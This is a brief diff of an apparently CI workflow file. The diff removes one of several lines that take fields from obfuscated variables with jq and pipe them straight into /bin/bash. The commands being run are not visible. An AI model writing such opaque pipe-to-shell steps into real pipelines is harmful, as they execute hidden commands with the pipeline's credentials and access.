@@ -21,7 +21,6 @@ jobs:
           echo $aghzn5 | jq -r .kify15 | /bin/bash
           printf '%s' "$iyun30" | jq -r .uf9 | /bin/bash
           printf '%s' "$sxf614" | jq -r .rgv62769 | /bin/bash
-          echo $zayuj111 | jq -r .benx9 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
